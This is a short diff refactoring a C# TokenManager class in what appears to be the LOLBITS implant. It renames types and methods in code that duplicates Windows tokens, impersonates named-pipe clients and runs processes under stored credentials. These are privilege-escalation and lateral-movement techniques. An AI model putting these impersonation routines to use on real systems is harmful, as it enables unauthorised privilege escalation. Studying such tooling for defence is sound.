@@ -16,17 +16,17 @@ namespace LOLBITS
         public static readonly string[] Credentials = new string[3]; // user - domain ('.' for local) - password 
         private static string _pipeName;
         private const int NumThreads = 1;
-        private readonly SyscallManager sysCall;
+        private readonly SysCallManager sysCall;
 
 
-        public TokenManager(SyscallManager sysCall)
+        public TokenManager(SysCallManager sysCall)
         {
             Token = IntPtr.Zero;
             Method = 0;
             this.sysCall = sysCall;
         }
 
-        public void Rev2Self()
+        public static void Rev2Self()
         {
             Token = IntPtr.Zero;
             Method = 0;
@@ -60,7 +60,7 @@ namespace LOLBITS
 
                 Utils.TokenAccessFlags tokenAccess = Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
                    Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
-                   Utils.TokenAccessFlags.TokenAdjustSessionid;
+                   Utils.TokenAccessFlags.TokenAdjustSessionId;
 
                 Utils.DuplicateToken(ptoken, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation, Utils.TokenType.TokenPrimary, out imptoken);
 
@@ -146,7 +146,7 @@ namespace LOLBITS
                 string filename = ss.ReadString();
                 Utils fileReader = new Utils();
 
-                pipeServer.RunAsClient(fileReader.Start);
+                pipeServer.RunAsClient(Utils.Start);
 
                 // Catch the IOException that is raised if the pipe is broken
                 // or disconnected.
@@ -160,7 +160,7 @@ namespace LOLBITS
 
         }
 
-        public bool Runas(string domain, string user, string password)
+        public static bool RunAs(string domain, string user, string password)
         {
             Utils.RunAs(domain, user, password);
 
